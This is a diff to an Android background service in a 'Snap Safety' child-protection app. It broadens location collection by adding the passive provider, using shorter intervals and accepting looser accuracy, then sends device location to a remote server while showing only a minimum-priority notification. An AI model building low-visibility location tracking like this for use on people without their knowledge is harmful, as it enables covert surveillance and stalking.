@@ -73,18 +73,21 @@ public class CompanionSyncService extends Service {
         if (locationManager == null || locationListener == null) return;
         new Handler(Looper.getMainLooper()).post(() -> {
             try {
-                long interval = isLiveMovementActive ? 3000L : 30000L;
-                float dist = isLiveMovementActive ? 1.0f : 10.0f;
+                long interval = isLiveMovementActive ? 3000L : 20000L;
+                float dist = isLiveMovementActive ? 1.0f : 5.0f;
                 Location best = null;
-                long now = System.currentTimeMillis();
-                for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER}) {
-                    if (locationManager.isProviderEnabled(p)) {
-                        locationManager.requestLocationUpdates(p, interval, dist, locationListener, Looper.getMainLooper());
-                        Location last = locationManager.getLastKnownLocation(p);
-                        if (last != null && Math.abs(last.getLatitude()) > 0.0001 && (now - last.getTime()) < 180000L && last.getAccuracy() <= 50.0f) {
-                            if (best == null || last.getAccuracy() < best.getAccuracy()) best = last;
+                for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER}) {
+                    try {
+                        if (locationManager.isProviderEnabled(p)) {
+                            locationManager.requestLocationUpdates(p, interval, dist, locationListener, Looper.getMainLooper());
                         }
-                    }
+                    } catch (Throwable ignored) {}
+                    try {
+                        Location last = locationManager.getLastKnownLocation(p);
+                        if (last != null && Math.abs(last.getLatitude()) > 0.0001 && Math.abs(last.getLongitude()) > 0.0001) {
+                            if (best == null || last.getTime() > best.getTime()) best = last;
+                        }
+                    } catch (Throwable ignored) {}
                 }
                 if (best != null) dispatchLocation(best);
             } catch (Throwable ignored) {}
@@ -94,10 +97,11 @@ public class CompanionSyncService extends Service {
     private void dispatchLocation(Location loc) {
         final String deviceId = prefs.getString("device_id", null);
         final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
-        if (deviceId == null || loc == null || loc.getAccuracy() > 65.0f) return;
+        if (deviceId == null || loc == null) return;
+        if (loc.hasAccuracy() && loc.getAccuracy() > 1500.0f) return;
         double lat = loc.getLatitude(), lng = loc.getLongitude();
         if (Math.abs(lat) < 0.0001 && Math.abs(lng) < 0.0001) return;
-        if (!isLiveMovementActive && Math.abs(lat - lastLat) < 0.00005 && Math.abs(lng - lastLng) < 0.00005) return;
+        if (!isLiveMovementActive && Math.abs(lat - lastLat) < 0.00002 && Math.abs(lng - lastLng) < 0.00002) return;
         lastLat = lat; lastLng = lng;
 
         try {
@@ -160,8 +164,7 @@ public class CompanionSyncService extends Service {
         try {
             Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
             if (bi == null) return 100;
-            int level = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-            int scale = bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+            int level = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1), scale = bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
             return (level >= 0 && scale > 0) ? (int) ((level / (float) scale) * 100) : 100;
         } catch (Throwable t) { return 100; }
     }
@@ -174,17 +177,11 @@ public class CompanionSyncService extends Service {
     }
 
     private Notification buildNotification() {
-        Intent launch = new Intent(this, MainActivity.class);
-        PendingIntent pi = PendingIntent.getActivity(this, 0, launch,
+        PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class),
                 Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
-        return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Snap Safety")
-                .setContentText("Child protection active")
-                .setSmallIcon(R.drawable.ic_launcher)
-                .setContentIntent(pi)
-                .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_MIN)
-                .build();
+        return new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Snap Safety")
+                .setContentText("Child protection active").setSmallIcon(R.drawable.ic_launcher)
+                .setContentIntent(pi).setOngoing(true).setPriority(NotificationCompat.PRIORITY_MIN).build();
     }
 
     @Override public IBinder onBind(Intent intent) { return null; }
